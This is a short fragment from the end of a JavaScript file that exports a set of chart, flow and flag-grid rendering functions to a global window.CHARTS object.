window.CHARTS={workstreamChart,lifelines,rampChart,hfChart,purposeChart,tsChart,funnel,boardField,flow:FLOW,flowRender,flowSetMode,flowGo,flowKind:FLOWKIND,flagFlow:FFLOW,flagRender:ffRender,flagGo:ffGo,flagKind:FFKIND,flagGrid:FGSTATE,flagGridRender:fgRender,
  initFlagFlow,initFlagGrid};
})();
